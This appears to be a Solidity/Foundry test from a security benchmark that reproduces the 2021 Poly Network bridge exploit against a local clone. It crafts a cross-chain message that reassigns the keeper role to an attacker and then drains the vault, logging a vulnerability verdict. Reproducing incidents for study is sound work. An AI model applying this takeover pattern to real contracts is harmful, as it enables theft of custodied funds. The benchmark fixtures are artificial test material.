// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {
    IERC20Like,
    PolyCrossChainData,
    PolyCrossChainManager,
    PolyLockProxy
} from "../fixtures/upgrade-governance/b-incident/PolyNetworkClone.sol";

/// @title upgrade-governance tier (b): Poly Network exploit (2021-08-10, Ethereum, ~$611M).
/// @notice Minimized offline reproduction of the documented mechanism: the cross-chain
///         manager executed inbound messages with its own authority and did not stop a
///         message from targeting its own privileged keeper-management function. The attacker
///         crafted a message that reassigned the keeper role to themselves, then authorized
///         withdrawals that drained the vault. Verdict derived from the real outcome: a
///         privileged-role takeover empties the custodied assets. See PROVENANCE.md.
contract PolyNetworkIncidentTest is Test {
    uint256 constant VAULT_FUNDS = 500_000e18; // representative, scaled
    address constant LEGIT_KEEPER = address(0x600D);
    address constant ATTACKER = address(0xBAD55);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[upgrade-governance] target=", target, " verdict=", verdict));
    }

    function test_poly_keeperTakeover_drainsVault() public {
        MockERC20 asset = new MockERC20();
        PolyCrossChainManager manager = new PolyCrossChainManager(LEGIT_KEEPER);
        PolyCrossChainData data = manager.data();
        PolyLockProxy lock = new PolyLockProxy(data, IERC20Like(address(asset)));

        // The lock-proxy vault custodies bridged assets.
        asset.mint(address(lock), VAULT_FUNDS);
        assertEq(data.keeper(), LEGIT_KEEPER, "keeper starts as the legitimate operator");

        // The attacker cannot withdraw yet (not the keeper).
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("not keeper"));
        lock.withdraw(ATTACKER, VAULT_FUNDS);

        // ATTACK: craft a message that makes the manager call putKeeper on its OWN privileged
        // storage, reassigning the keeper role to the attacker.
        bytes memory takeover = abi.encodeWithSignature("putKeeper(address)", ATTACKER);
        vm.prank(ATTACKER);
        manager.verifyHeaderAndExecuteTx(address(data), takeover);
        assertEq(data.keeper(), ATTACKER, "keeper role taken over");

        // As the new keeper, the attacker authorizes a withdrawal and drains the vault.
        vm.prank(ATTACKER);
        lock.withdraw(ATTACKER, VAULT_FUNDS);

        bool drained = (asset.balanceOf(address(lock)) == 0 && asset.balanceOf(ATTACKER) == VAULT_FUNDS);
        _report("poly-keeper-takeover-victim", drained);

        assertTrue(drained, "keeper-role takeover via unguarded executor should drain the vault");
        assertEq(asset.balanceOf(ATTACKER), VAULT_FUNDS, "attacker drained the vault");
    }
}
